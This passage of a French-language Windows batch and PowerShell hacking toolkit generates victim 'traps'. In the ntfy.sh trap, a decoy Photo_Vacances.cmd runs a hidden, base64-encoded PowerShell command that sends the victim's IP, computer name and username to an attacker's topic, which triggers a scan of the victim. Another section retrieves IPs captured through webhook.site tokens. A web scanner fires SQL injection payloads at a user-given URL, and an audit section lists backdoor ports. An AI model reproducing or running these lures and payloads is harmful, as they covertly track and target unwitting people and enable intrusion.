>> "%PS_HTML%" echo         if ($Host.UI.RawUI.KeyAvailable) {
>> "%PS_HTML%" echo           if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
>> "%PS_HTML%" echo         }
>> "%PS_HTML%" echo       }
>> "%PS_HTML%" echo     }
>> "%PS_HTML%" echo   }
>> "%PS_HTML%" echo   if (Test-Path $desk) { Remove-Item $desk -Force -EA SilentlyContinue }
>> "%PS_HTML%" echo   if ($found) {
>> "%PS_HTML%" echo     Set-Content $capFile -Value "$ip_val;$pc_val;" -Encoding ASCII
>> "%PS_HTML%" echo     Write-Host '  [-^>] IP capturee ! Lancement du scan...' -f Green
>> "%PS_HTML%" echo   }
>> "%PS_HTML%" echo } catch { Write-Host "  [ERREUR] $($_.Exception.Message)" -f Red }
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_HTML%"
if exist "%PS_HTML%" del /f /q "%PS_HTML%"
if exist "%CAPFILE%" (
    set /p capture_data=<"%CAPFILE%"
    for /f "tokens=1,2,3 delims=;" %%a in ("!capture_data!") do (
        set "remote_ip=%%a"
        set "remote_pc=%%b"
        set "remote_user=%%c"
    )
    del /f /q "%CAPFILE%"
    if defined remote_ip (
        echo  [-^>] IP capturee ! Scan automatique en cours...
        timeout /t 2 >nul
        goto wan_public_scan
    )
)
goto gm_traps_menu

REM --- [4] Recuperer captures passees (tokens webhook sauvegardes) ---
:gm_retrieve_past
cls
echo.
echo  [*] RECUPERER LES CAPTURES PASSEES
echo  [i] Consultation des tokens webhook.site sauvegardes...
echo.
if not exist "%~dp0webhook_tokens.txt" (
    echo  [i] Aucun token sauvegarde. Generez d'abord un piege HTML ou WEBHOOK.
    echo.
    pause >nul
    goto gm_traps_menu
)
set "PS_RTRV=%TEMP%\retrieve_%RANDOM%.ps1"
set "RTRV_DIR=%~dp0"
set "RTRV_DIR=%RTRV_DIR:~0,-1%"
powershell -NoProfile -Command "$b='W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgokdG9rRmlsZSAgID0gJ1BBVEhQTEFDRUhPTERFUlx3ZWJob29rX3Rva2Vucy50eHQnCiRpcERpc3RhbnQgPSAnUEFUSFBMQUNFSE9MREVSXGlwIGRpc3RhbnQudHh0JwokZm91bmRUb3RhbCA9IDAKJGxpbmVzID0gQChHZXQtQ29udGVudCAkdG9rRmlsZSAtRUEgU2lsZW50bHlDb250aW51ZSkKaWYgKCRsaW5lcy5Db3VudCAtZXEgMCkgewogIFdyaXRlLUhvc3QgJyAgW2ldIEZpY2hpZXIgdG9rZW5zIHZpZGUuJyAtRm9yZWdyb3VuZENvbG9yIFllbGxvdwogICRudWxsID0gJEhvc3QuVUkuUmF3VUkuUmVhZEtleSgnTm9FY2hvLEluY2x1ZGVLZXlEb3duJykKICBleGl0Cn0KV3JpdGUtSG9zdCAoJyAgW2ldICcgKyAkbGluZXMuQ291bnQgKyAnIHRva2VuKHMpIGEgY29uc3VsdGVyLi4uJykgLUZvcmVncm91bmRDb2xvciBDeWFuCldyaXRlLUhvc3QgJycKZm9yZWFjaCAoJGxpbmUgaW4gJGxpbmVzKSB7CiAgJHBhcnRzID0gJGxpbmUgLXNwbGl0ICc7JwogIGlmICgkcGFydHMuQ291bnQgLWx0IDIpIHsgY29udGludWUgfQogICRkYXRlID0gJHBhcnRzWzBdOyAkYXBpID0gJHBhcnRzWzFdLlRyaW0oKQogIFdyaXRlLUhvc3QgKCcgID4+IFRva2VuIGR1ICcgKyAkZGF0ZSkgLUZvcmVncm91bmRDb2xvciBEYXJrWWVsbG93CiAgdHJ5IHsKICAgICRycyAgID0gSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkYXBpIC1UaW1lb3V0U2VjIDggLUVBIFN0b3AKICAgICRkYXRhID0gQCgkcnMuZGF0YSkKICAgIGlmICgkZGF0YS5Db3VudCAtZXEgMCkgeyBXcml0ZS1Ib3N0ICcgICAgIEF1Y3VuZSB2aXNpdGUuJyAtRm9yZWdyb3VuZENvbG9yIERhcmtHcmF5OyBjb250aW51ZSB9CiAgICBmb3JlYWNoICgkZCBpbiAkZGF0YSkgewogICAgICBpZiAoLW5vdCAkZC5pcCkgeyBjb250aW51ZSB9CiAgICAgICRpcCA9ICRkLmlwCiAgICAgICRzZWdzID0gaWYgKCRkLnVybCkgeyAkZC51cmwuVHJpbVN0YXJ0KCcvJykuU3BsaXQoJy8nKSB9IGVsc2UgeyBAKCkgfQogICAgICAkdWFfcmF3ID0gaWYgKCRzZWdzLkNvdW50IC1nZSAyKSB7IHRyeSB7IFt1cmldOjpVbmVzY2FwZURhdGFTdHJpbmcoJHNlZ3NbLTJdKSB9IGNhdGNoIHsgJHNlZ3NbLTJdIH0gfSBlbHNlIHsgJycgfQogICAgICAkc2NyID0gaWYgKCRzZWdzLkNvdW50IC1nZSAxKSB7ICRzZWdzWy0xXSB9IGVsc2UgeyAnPycgfQogICAgICAkYnJvd3NlciA9IGlmICgkdWFfcmF3IC1tYXRjaCAnRWRnLycpIHsgJ0VkZ2UnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnQ2hyb21lLycpIHsgJ0Nocm9tZScgfSBlbHNlaWYgKCR1YV9yYXcgLW1hdGNoICdGaXJlZm94LycpIHsgJ0ZpcmVmb3gnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnU2FmYXJpLycpIHsgJ1NhZmFyaScgfSBlbHNlaWYgKCR1YV9yYXcpIHsgJ0Jyb3dzZXInIH0gZWxzZSB7ICdIVE1MLVRyYWNrZXInIH0KICAgICAgJG9zID0gaWYgKCR1YV9yYXcgLW1hdGNoICdXaW5kb3dzIE5UIDFbMDFdJykgeyAnV2luMTAtMTEnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnV2luZG93cycpIHsgJ1dpbmRvd3MnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnQW5kcm9pZCcpIHsgJ0FuZHJvaWQnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnaVBob25lfGlQYWQnKSB7ICdpT1MnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnTWFjJykgeyAnbWFjT1MnIH0gZWxzZWlmICgkdWFfcmF3IC1tYXRjaCAnTGludXgnKSB7ICdMaW51eCcgfSBlbHNlaWYgKCR1YV9yYXcpIHsgJ09TPycgfSBlbHNlIHsgJ0hUTUwnIH0KICAgICAgJHBjID0gaWYgKCR1YV9yYXcpIHsgJG9zICsgJy0nICsgJGJyb3dzZXIgfSBlbHNlIHsgJ0hUTUwtVHJhY2tlcicgfQogICAgICAkdXNyID0gaWYgKCRzY3IgLW1hdGNoICd4JykgeyAkc2NyIH0gZWxzZSB7ICdwaXhlbCcgfQogICAgICAkZm91bmRUb3RhbCsrCiAgICAgIFdyaXRlLUhvc3QgKCcgICAgIElQIDogJyArICRpcCArICcgIHwgICcgKyAkcGMgKyAnICB8ICAnICsgJHVzcikgLUZvcmVncm91bmRDb2xvciBHcmVlbgogICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRpcERpc3RhbnQpKSB7ICRudWxsID0gTmV3LUl0ZW0gJGlwRGlzdGFudCAtSXRlbVR5cGUgRmlsZSAtRm9yY2UgfQogICAgICBpZiAoU2VsZWN0LVN0cmluZyAtUGF0aCAkaXBEaXN0YW50IC1QYXR0ZXJuIChbcmVnZXhdOjpFc2NhcGUoJGlwKSkgLVF1aWV0IC1FQSBTaWxlbnRseUNvbnRpbnVlKSB7CiAgICAgICAgV3JpdGUtSG9zdCAnICAgICAtPiBEZWphIHByZXNlbnRlJyAtRm9yZWdyb3VuZENvbG9yIERhcmtHcmF5CiAgICAgIH0gZWxzZSB7CiAgICAgICAgJGVudHJ5ID0gJ1snICsgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW0nKSArICddIElQOiAnICsgJGlwICsgJyAtLSBQQzogJyArICRwYyArICcgLS0gVXNlcjogJyArICR1c3IKICAgICAgICBBZGQtQ29udGVudCAkaXBEaXN0YW50IC1WYWx1ZSAkZW50cnkgLUVuY29kaW5nIFVURjgKICAgICAgICBXcml0ZS1Ib3N0ICcgICAgIC0+IEFqb3V0ZWUgZGFucyBpcCBkaXN0YW50LnR4dCcgLUZvcmVncm91bmRDb2xvciBDeWFuCiAgICAgIH0KICAgIH0KICB9IGNhdGNoIHsKICAgIFdyaXRlLUhvc3QgKCcgICAgIEVycmV1ciA6ICcgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUZvcmVncm91bmRDb2xvciBSZWQKICB9Cn0KV3JpdGUtSG9zdCAnJwppZiAoJGZvdW5kVG90YWwgLWd0IDApIHsKICBXcml0ZS1Ib3N0ICgnICBbK10gJyArICRmb3VuZFRvdGFsICsgJyBJUChzKSAhIGlwIGRpc3RhbnQudHh0IG1pcyBhIGpvdXIuJykgLUZvcmVncm91bmRDb2xvciBHcmVlbgp9IGVsc2UgewogIFdyaXRlLUhvc3QgJyAgW2ldIEF1Y3VuZSBjYXB0dXJlIGVuIGF0dGVudGUuJyAtRm9yZWdyb3VuZENvbG9yIFllbGxvdwp9CldyaXRlLUhvc3QgJyAgQXBwdXlleiBzdXIgdW5lIHRvdWNoZS4uLicgLUZvcmVncm91bmRDb2xvciBEYXJrR3JheQokbnVsbCA9ICRIb3N0LlVJLlJhd1VJLlJlYWRLZXkoJ05vRWNobyxJbmNsdWRlS2V5RG93bicpCg=='; $t=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); $t=$t.Replace('PATHPLACEHOLDER','%RTRV_DIR%'); [IO.File]::WriteAllText('%PS_RTRV%',$t)"
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_RTRV%"
if exist "%PS_RTRV%" del /f /q "%PS_RTRV%"
goto gm_traps_menu

REM --- [5] Email Trap ---
:gm_email_trap
cls
echo.
echo  ================================================
echo   [NOTIF] PIEGE NTFY.SH - NOTIFICATION INSTANTANEE
echo  ================================================
echo.
echo  [i] Genere Photo_Vacances.cmd sur le Bureau.
echo      Quand la cible l'execute, son IP arrive ici
echo      automatiquement et le scan se lance.
echo.
echo  [i] Choisissez un topic unique (ex: alex-trap-7842)
echo.
call :InputWithEsc "Votre topic ntfy.sh : " grab_email
if errorlevel 1 goto gm_traps_menu
if not defined grab_email goto gm_traps_menu
set "PS_EM=%TEMP%\ig_em_%RANDOM%.ps1"
set "PS_NTFY=%TEMP%\ntfy_wait_%RANDOM%.ps1"
set "CAPFILE_EM=%TEMP%\captured_ntfy.txt"
set "IPDIST=%~dp0ip distant.txt"
set "gemail=!grab_email!"
REM --- Generation du CMD piege ---
>> "%PS_EM%" echo $cmdPath = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
>> "%PS_EM%" echo $ntfy = 'https://ntfy.sh/%gemail%'
>> "%PS_EM%" echo $psp = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$msg='IP: '+`$ip+' ^| PC: '+`$env:COMPUTERNAME+' ^| User: '+`$env:USERNAME; `$h=@{Title='Cible Identifiee';Priority='high';Tags='warning'}; Invoke-RestMethod -Uri '$ntfy' -Method Post -Body `$msg -Headers `$h -UseBasicParsing } catch {}"
>> "%PS_EM%" echo $bytes = [System.Text.Encoding]::Unicode.GetBytes($psp)
>> "%PS_EM%" echo $b64 = [Convert]::ToBase64String($bytes)
>> "%PS_EM%" echo $lines = @('@echo off', '', "start /B powershell -w 1 -nop -ep bypass -EncodedCommand $b64", '', 'exit')
>> "%PS_EM%" echo Set-Content -Path $cmdPath -Value $lines -Encoding ASCII
>> "%PS_EM%" echo Write-Host '  [OK] Photo_Vacances.cmd genere sur le Bureau' -f Green
>> "%PS_EM%" echo Write-Host "  [i] Topic : https://ntfy.sh/%gemail%" -f Cyan
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_EM%"
if exist "%PS_EM%" del /f /q "%PS_EM%"
start "" "https://ntfy.sh/!gemail!"
REM --- Attente reception ntfy.sh + sauvegarde ip distant.txt ---
>> "%PS_NTFY%" echo $Host.UI.RawUI.FlushInputBuffer()
>> "%PS_NTFY%" echo $topic = '%gemail%'
>> "%PS_NTFY%" echo $capFile = '%CAPFILE_EM%'
>> "%PS_NTFY%" echo $logFile = '%IPDIST%'
>> "%PS_NTFY%" echo Write-Host ("  [D] logFile : " + $logFile) -f DarkGray
>> "%PS_NTFY%" echo $since = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
>> "%PS_NTFY%" echo Write-Host ("  [D] since   : " + $since) -f DarkGray
>> "%PS_NTFY%" echo $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
>> "%PS_NTFY%" echo Write-Host '  [i] En attente de la cible... (ECHAP pour annuler)' -f DarkYellow
>> "%PS_NTFY%" echo Write-Host ''
>> "%PS_NTFY%" echo while (-not $esc -and -not $found) {
>> "%PS_NTFY%" echo   if ($Host.UI.RawUI.KeyAvailable) {
>> "%PS_NTFY%" echo     if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
>> "%PS_NTFY%" echo   }
>> "%PS_NTFY%" echo   try {
>> "%PS_NTFY%" echo     $r = Invoke-WebRequest "https://ntfy.sh/$topic/json?poll=1&since=$since" -UseBasicParsing -TimeoutSec 5 -EA Stop
>> "%PS_NTFY%" echo     $rb = $r.Content; if ($rb -is [byte[]]) { $ct = [System.Text.Encoding]::UTF8.GetString($rb).Trim() } else { $ct = $rb.Trim() }
>> "%PS_NTFY%" echo     Write-Host ("`r  [D] raw: " + $ct.Substring(0,[Math]::Min(200,$ct.Length))) -f DarkGray
>> "%PS_NTFY%" echo     if ($ct.Length -eq 0) { throw 'empty' }
>> "%PS_NTFY%" echo     $items = @()
>> "%PS_NTFY%" echo     try { $p = $ct ^| ConvertFrom-Json; $items = @($p) } catch {}
>> "%PS_NTFY%" echo     if ($items.Count -eq 0) { foreach ($ln in ($ct -split "[\r\n]+" ^| Where-Object { $_.Trim() -ne '' })) { try { $items += ($ln ^| ConvertFrom-Json) } catch {} } }
>> "%PS_NTFY%" echo     Write-Host ("  [D] items : " + $items.Count) -f DarkGray
>> "%PS_NTFY%" echo     foreach ($obj in $items) {
>> "%PS_NTFY%" echo       Write-Host ("  [D] event=" + $obj.event + " msg=" + $obj.message) -f DarkGray
>> "%PS_NTFY%" echo       if ($obj.event -eq 'message' -and $obj.message -match 'IP: (\S+) .+? PC: (\S+) .+? User: (.+)') {
>> "%PS_NTFY%" echo         $ip_val=$matches[1].Trim(); $pc_val=$matches[2].Trim(); $usr_val=$matches[3].Trim()
>> "%PS_NTFY%" echo         $found = $true
>> "%PS_NTFY%" echo         Write-Host ''
>> "%PS_NTFY%" echo         Write-Host '  =================================================' -f Red
>> "%PS_NTFY%" echo         Write-Host ("  IP   : " + $ip_val) -f Cyan
>> "%PS_NTFY%" echo         Write-Host ("  PC   : " + $pc_val) -f White
>> "%PS_NTFY%" echo         Write-Host ("  User : " + $usr_val) -f White
>> "%PS_NTFY%" echo         Write-Host '  =================================================' -f Red
>> "%PS_NTFY%" echo         $ts = Get-Date -Format '[dd/MM/yyyy  H:mm:ss,ff]'
>> "%PS_NTFY%" echo         $line = "$ts [NTFY] IP: $ip_val -- PC: $pc_val -- User: $usr_val "
>> "%PS_NTFY%" echo         Write-Host ("  [D] Ecriture : " + $line) -f DarkGray
>> "%PS_NTFY%" echo         try { Add-Content -LiteralPath $logFile -Value $line -Encoding UTF8; Write-Host '  [OK] Sauvegarde ip distant.txt' -f Green } catch { Write-Host ("  [ERR] Add-Content : " + $_) -f Red }
>> "%PS_NTFY%" echo         try { Set-Content -LiteralPath $capFile -Value "$ip_val;$pc_val;$usr_val" -Encoding ASCII } catch {}
>> "%PS_NTFY%" echo         break
>> "%PS_NTFY%" echo       } else { Write-Host '  [D] regex no match' -f DarkGray }
>> "%PS_NTFY%" echo     }
>> "%PS_NTFY%" echo   } catch { Write-Host ("  [ERR] WebRequest : " + $_) -f Red }
>> "%PS_NTFY%" echo   if (-not $found) {
>> "%PS_NTFY%" echo     $i = 3
>> "%PS_NTFY%" echo     while ($i -gt 0) {
>> "%PS_NTFY%" echo       [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
>> "%PS_NTFY%" echo       $si++; $i--; Start-Sleep -Milliseconds 1000
>> "%PS_NTFY%" echo       if ($Host.UI.RawUI.KeyAvailable) {
>> "%PS_NTFY%" echo         if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
>> "%PS_NTFY%" echo       }
>> "%PS_NTFY%" echo     }
>> "%PS_NTFY%" echo   }
>> "%PS_NTFY%" echo }
>> "%PS_NTFY%" echo if ($found) { Write-Host '  [->] Lancement du scan...' -f Green }
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_NTFY%"
if exist "%PS_NTFY%" del /f /q "%PS_NTFY%"
if exist "%CAPFILE_EM%" (
    set /p cap_em=<"%CAPFILE_EM%"
    for /f "tokens=1 delims=;" %%a in ("!cap_em!") do set "remote_ip=%%a"
    for /f "tokens=2 delims=;" %%b in ("!cap_em!") do set "remote_pc=%%b"
    for /f "tokens=3 delims=;" %%c in ("!cap_em!") do set "remote_user=%%c"
    del /f /q "%CAPFILE_EM%"
    if defined remote_ip (
        chcp 65001 >nul
        timeout /t 2 >nul
        goto wan_public_scan
    )
)
goto gm_traps_menu

REM --- [5] Saisie Manuelle ---
:cyber_triage
cls
echo.
echo  ================================================
echo   TRIAGE DE CONNECTIVITE (FLASH)
echo  ================================================
echo.
echo   [>] 1. Analyse de la configuration IP...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '127.0.0.1'} | Select-Object @{N='Interface';E={$_.InterfaceAlias}}, @{N='Adresse_IP';E={$_.IPAddress}} | Format-Table -AutoSize"
echo   [>] 2. Test de la passerelle (Box)...
powershell -NoProfile -Command "$gw=(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -EA SilentlyContinue | Select-Object -ExpandProperty NextHop -First 1); if($gw){Write-Host '      [OK] Passerelle detectee :' $gw -f Green} else {Write-Host '      [ECHEC] Aucune passerelle !' -f Red}"
echo   [>] 3. Verification des serveurs DNS...
powershell -NoProfile -Command "$dns=(Get-DnsClientServerAddress).ServerAddresses | Select-Object -Unique; if($dns){Write-Host '      [OK] DNS actifs :' ($dns -join ', ') -f Green} else {Write-Host '      [ECHEC] Pas de DNS !' -f Red}"
echo.
echo. 
echo   [>] 4. Cartes reseau physiques (Hardware)...
powershell -NoProfile -Command "Write-Host ' NOM             | STATUT       | VITESSE      | ADRESSE MAC' -f White; Write-Host ' ---------------|--------------|--------------|-------------------' -f Gray; Get-NetAdapter -EA SilentlyContinue | Where-Object {$_.Status -ne 'Not Present'} | ForEach-Object { $s = switch($_.Status){'Up'{'Actif'};'Down'{'Inactif'};'Disconnected'{'Deconnecte'};default{$_.Status}}; Write-Host (' {0,-15} | {1,-12} | {2,-12} | {3}' -f $_.Name, $s, $_.LinkSpeed, $_.MacAddress) -f Gray }"
pause
if defined _net_back goto %_net_back%
goto net_cyber_menu


:cyber_flux_analysis
cls
echo.
echo  ================================================
echo   ANALYSE DES FLUX (PORTS ET PROCESSUS)
echo  ================================================
powershell -NoProfile -Command "$conns = Get-NetTCPConnection -State Established,Listen -EA SilentlyContinue; if($conns){ $conns | Select-Object @{N='Port_Local';E={$_.LocalPort}}, @{N='Adresse_Distante';E={$_.RemoteAddress}}, @{N='Etat';E={$_.State}}, @{N='Processus';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}} | Sort-Object Etat | Format-Table -AutoSize } else { Write-Host '   Aucune connexion active detectee.' -f Yellow }"
echo.
pause
if defined _net_back goto %_net_back%
goto net_cyber_menu

:cyber_security_audit
cls
echo.
echo  ================================================
echo   AUDIT DE SECURITE ET DEFENSE
echo  ================================================
echo   Audite le pare-feu, les partages SMB et
echo   detecte les ports pirates.
echo.
echo  1. Etat du Pare-feu :
powershell -NoProfile -Command "$f = Get-NetFirewallProfile; foreach($p in $f){ $c = if($p.Enabled -eq 'True'){'Green'}else{'Red'}; $st = if($p.Enabled -eq 'True'){'ACTIF'}else{'INACTIF'}; Write-Host ('   [' + $p.Name + '] : ' + $st) -f $c }"
echo.
echo  2. Detection de Ports Suspects (RAT/Backdoors) :
powershell -NoProfile -Command "$sp=@{1337='DarkComet';4444='Metasploit';31337='BackOrifice';3389='RDP (Acces Distant)'}; $open=Get-NetTCPConnection -State Listen -EA SilentlyContinue | Select-Object -ExpandProperty LocalPort; $found=$false; foreach($p in $sp.Keys){ if($open -contains $p){ Write-Host ('   [ALERTE] Port ' + $p + ' ouvert - ' + $sp[$p]) -f Red; $found=$true } }; if(-not $found){ Write-Host '   [OK] Aucun port pirate suspect.' -f Green }"
echo.
echo  3. Partages Reseau Ouverts (SMB) :
powershell -NoProfile -Command "$s = Get-SmbShare | Where-Object {$_.Name -notmatch '\$'}; if($s){ $s | Select-Object @{N='Nom';E={$_.Name}}, @{N='Chemin';E={$_.Path}}, @{N='Description';E={$_.Description}} | Format-Table -AutoSize } else { Write-Host '   [OK] Aucun dossier partage visible sur le reseau.' -f Green }"
echo.
echo  [i] ANALYSE DES RISQUES (Defense) :
echo  1. Firewall : S'il est desactive, n'importe qui peut scanner vos ports.
echo  2. Backdoors : Les ports 4444 ou 1337 indiquent souvent une infection active.
echo  3. Partages : SMB est le vecteur prefere des ransomwares (WannaCry).
echo  CONSEIL : Activez toujours votre pare-feu et desactivez SMBv1.
echo.
pause
goto net_cyber_menu

:cyber_web_pentest
cls
echo.
echo  ================================================
echo   SCANNER DE VULNERABILITES WEB (PENTEST)
echo  ================================================
echo   Scan automatise des failles courantes : 
echo   Headers, SSL, SQLi, XSS, SSTI et plus.
echo.
echo  [i] Ce module teste : Headers, SSL, SQLi, XSS, SSTI,
echo      CORS, Rate Limit, Clickjacking, Prototype Pollution.
echo.
echo  Entrez l'URL a tester (ex: https://example.com ou https://site.com?id=1)
set "ALEEX_PENTEST_URL="
set /p "ALEEX_PENTEST_URL=URL : "
if not defined ALEEX_PENTEST_URL goto net_cyber_menu

echo.
echo  [i] Demarrage du scan pour !ALEEX_PENTEST_URL!...
echo  (Appuyez sur ECHAP pour annuler)
echo.

set "WPS=%TEMP%\wpentest_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"

echo $url = $env:ALEEX_PENTEST_URL >> "%WPS%"
echo if ([string]::IsNullOrWhiteSpace($url)) { Write-Host "  [!] URL vide." -f Red; exit } >> "%WPS%"
echo if ($url -notmatch '^^http') { $url = 'https://' + $url } >> "%WPS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" >> "%WPS%"
echo $findings = @() >> "%WPS%"
echo $score = 100 >> "%WPS%"
echo. >> "%WPS%"
echo function Print-Result($sev, $msg) { >> "%WPS%"
echo     $script:findings += [PSCustomObject]@{Sev=$sev;Msg=$msg} >> "%WPS%"
echo     $c = switch($sev){ 'CRITICAL' {'Magenta'}; 'HIGH' {'Red'}; 'MEDIUM' {'Yellow'}; 'LOW' {'Cyan'}; default {'Green'} } >> "%WPS%"
echo     $label = switch($sev){ 'CRITICAL' {'CRITIQUE'}; 'HIGH' {'ELEVE'}; 'MEDIUM' {'MOYEN'}; 'LOW' {'FAIBLE'}; default {'INFO'} } >> "%WPS%"
echo     Write-Host "  [$label] " -NoNewline -f $c; Write-Host $msg >> "%WPS%"
echo     $pts = switch($sev){ 'CRITICAL' {25}; 'HIGH' {15}; 'MEDIUM' {8}; 'LOW' {3}; default {0} } >> "%WPS%"
echo     $script:score -= $pts >> "%WPS%"
echo } >> "%WPS%"
echo. >> "%WPS%"
echo function Show-Phase($num, $total, $label) { >> "%WPS%"
echo     $bar = '#' * $num + '.' * ($total - $num) >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [$bar] Phase $num/$total - $label" -f Cyan >> "%WPS%"
echo } >> "%WPS%"
echo. >> "%WPS%"
echo Write-Host "  Cible : $url" -f DarkGray >> "%WPS%"
echo Write-Host "" >> "%WPS%"
echo. >> "%WPS%"
echo try { >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 1/7 - HEADERS ET COOKIES >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 1 7 "Headers et Cookies" >> "%WPS%"
echo try { >> "%WPS%"
echo     $resp = Invoke-WebRequest $url -UserAgent $ua -Method Get -TimeoutSec 15 -EA Stop -UseBasicParsing >> "%WPS%"
echo     $h = $resp.Headers >> "%WPS%"
echo     $headersToCheck = @{ >> "%WPS%"
echo         'Content-Security-Policy'      = 'MEDIUM' >> "%WPS%"
echo         'X-Frame-Options'              = 'MEDIUM' >> "%WPS%"
echo         'X-Content-Type-Options'       = 'LOW' >> "%WPS%"
echo         'Strict-Transport-Security'    = 'MEDIUM' >> "%WPS%"
echo         'Permissions-Policy'           = 'LOW' >> "%WPS%"
echo         'Cross-Origin-Opener-Policy'   = 'LOW' >> "%WPS%"
echo         'Cross-Origin-Resource-Policy' = 'LOW' >> "%WPS%"
echo         'X-XSS-Protection'             = 'LOW' >> "%WPS%"
echo         'Referrer-Policy'              = 'LOW' >> "%WPS%"
echo     } >> "%WPS%"
echo     foreach ($k in $headersToCheck.Keys) { >> "%WPS%"
echo         if (-not $h.ContainsKey($k)) { Print-Result $headersToCheck[$k] "Header manquant : $k" } >> "%WPS%"
echo     } >> "%WPS%"
echo     if ($h['Server'])          { Print-Result 'LOW' ("Server expose : " + $h['Server']) } >> "%WPS%"
echo     if ($h['X-Powered-By'])    { Print-Result 'LOW' ("Techno exposee : " + $h['X-Powered-By']) } >> "%WPS%"
echo     if ($h['X-AspNet-Version']){ Print-Result 'LOW' ("ASP.NET version : " + $h['X-AspNet-Version']) } >> "%WPS%"
echo     $xfo = $h['X-Frame-Options'] >> "%WPS%"
echo     if ($xfo -match 'ALLOW-FROM') { Print-Result 'LOW' "X-Frame-Options ALLOW-FROM obsolete" } >> "%WPS%"
echo     $cookies = $resp.Headers['Set-Cookie'] >> "%WPS%"
echo     if ($cookies) { >> "%WPS%"
echo         foreach ($c in $cookies) { >> "%WPS%"
echo             if ($c -notmatch 'HttpOnly') { Print-Result 'MEDIUM' "Cookie sans flag HttpOnly" } >> "%WPS%"
echo             if ($c -notmatch 'Secure')   { Print-Result 'MEDIUM' "Cookie sans flag Secure" } >> "%WPS%"
echo             if ($c -notmatch 'SameSite') { Print-Result 'LOW'    "Cookie sans flag SameSite" } >> "%WPS%"
echo         } >> "%WPS%"
echo     } >> "%WPS%"
echo     if ($findings.Count -eq 0) { Write-Host "  [OK] Tous les headers de securite sont presents." -f Green } >> "%WPS%"
echo } catch { Write-Host "  [!] Erreur headers : $($_.Exception.Message)" -f Gray } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 2/7 - SSL/TLS >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 2 7 "SSL/TLS" >> "%WPS%"
echo if ($url -like 'https*') { >> "%WPS%"
echo     try { >> "%WPS%"
echo         $req = [Net.HttpWebRequest]::Create($url) >> "%WPS%"
echo         $req.Timeout = 6000 >> "%WPS%"
echo         $res2 = $req.GetResponse() >> "%WPS%"
echo         $res2.Close() >> "%WPS%"
echo         Write-Host "  [OK] Certificat SSL valide." -f Green >> "%WPS%"
echo     } catch { Print-Result 'HIGH' "Probleme SSL : $($_.Exception.Message)" } >> "%WPS%"
echo } else { Print-Result 'MEDIUM' "Site servi en HTTP (pas HTTPS)" } >> "%WPS%"
echo try { >> "%WPS%"
echo     $opt = Invoke-WebRequest $url -Method OPTIONS -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo     if ($opt.Headers['Allow']) { >> "%WPS%"
echo         $methods = $opt.Headers['Allow'] >> "%WPS%"
echo         Write-Host "  [INFO] Methodes : $methods" -f DarkGray >> "%WPS%"
echo         if ($methods -match 'TRACE^|CONNECT') { Print-Result 'MEDIUM' "Methode dangereuse activee : $methods" } >> "%WPS%"
echo     } >> "%WPS%"
echo } catch {} >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 3/7 - SQL INJECTION >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 3 7 "SQL Injection" >> "%WPS%"
echo $baseParams = @('id','cat','page','query','search','user','name','type','item','product','ref','sort') >> "%WPS%"
echo $sqlPayloads = @( >> "%WPS%"
echo     [char]39, >> "%WPS%"
echo     [char]34, >> "%WPS%"
echo     ([char]39 + ' OR 1=1--'), >> "%WPS%"
echo     ('admin' + [char]39 + '--'), >> "%WPS%"
echo     ' order by 10--', >> "%WPS%"
echo     '1 AND 1=2--', >> "%WPS%"
echo     '1 UNION SELECT NULL--' >> "%WPS%"
echo ) >> "%WPS%"
echo $sqlErrors = @( >> "%WPS%"
echo     'sql syntax','mysql','sqlite','syntax error','PostgreSQL', >> "%WPS%"
echo     'Microsoft OLE DB','Oracle Error','MariaDB','System.Data.SqlClient', >> "%WPS%"
echo     'You have an error','supplied argument','ODBC','Warning.*mysqli', >> "%WPS%"
echo     'Incorrect syntax','Unclosed quotation','SQLSTATE','DB Error', >> "%WPS%"
